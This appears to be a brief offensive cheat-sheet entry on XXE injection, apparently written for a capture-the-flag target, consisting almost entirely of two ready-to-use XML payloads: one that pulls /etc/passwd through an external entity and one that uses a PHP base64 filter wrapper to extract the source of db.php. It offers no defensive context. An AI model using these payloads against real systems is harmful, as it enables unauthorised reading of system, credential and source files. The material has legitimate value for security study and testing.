# XXE
----

Basic payload:
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "/etc/passwd">
]>
		<bugreport>
		<title>&file;</title>
		<cwe>12</cwe>
		<cvss>33</cvss>
		<reward>9090</reward>
		</bugreport>
```

In PHP applications, xml wont be able to parse bad characters so we have to base64 encode it to retrieve files:
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>12</cwe>
		<cvss>33</cvss>
		<reward>9090</reward>
``` 